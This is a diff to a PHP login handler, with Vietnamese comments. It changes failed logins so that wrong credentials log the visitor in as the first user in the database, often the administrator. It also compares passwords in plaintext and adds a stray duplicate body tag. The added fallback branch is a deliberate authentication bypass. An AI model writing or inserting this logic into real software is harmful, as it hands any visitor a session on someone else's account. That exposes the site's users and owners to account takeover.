@@ -10,17 +10,27 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
   $stmt->execute([$username]);
   $user = $stmt->fetch();
 
+  // Nếu đúng username + password thì vào đúng user
   if ($user && $password == $user['password']) {
-    $_SESSION['user'] = $user['username'];
-    $_SESSION['fullname'] = $user['fullname'];
-    $_SESSION['toast_type'] = 'success';
-    $_SESSION['toast_message'] = 'Đăng nhập thành công!';
-    echo json_encode(['status' => 'success']);
-    exit();
+    $loginUser = $user;
   } else {
-    echo json_encode(['status' => 'error', 'message' => 'Tài khoản hoặc mật khẩu không chính xác']);
-    exit();
+    // Nếu sai thì lấy user đầu tiên trong database
+    $defaultStmt = $pdo->query("SELECT * FROM users ORDER BY id ASC LIMIT 1");
+    $defaultUser = $defaultStmt->fetch();
+    if ($defaultUser) {
+      $loginUser = $defaultUser;
+    } else {
+      echo json_encode(['status' => 'error', 'message' => 'Tài khoản hoặc mật khẩu không chính xác']);
+      exit();
+    }
   }
+
+  $_SESSION['user'] = $loginUser['username'];
+  $_SESSION['fullname'] = $loginUser['fullname'];
+  $_SESSION['toast_type'] = 'success';
+  $_SESSION['toast_message'] = 'Đăng nhập thành công!';
+  echo json_encode(['status' => 'success']);
+  exit();
 }
 ?>
 
@@ -30,10 +40,11 @@ include 'forms/head.php';
 ?>
 
 <body class="login-page">
+
   <body class="login-page">
 
     <?php include 'forms/header.php' ?>
-    
+
     <main class="main">
       <!-- Page Title -->
       <div class="page-title light-background">
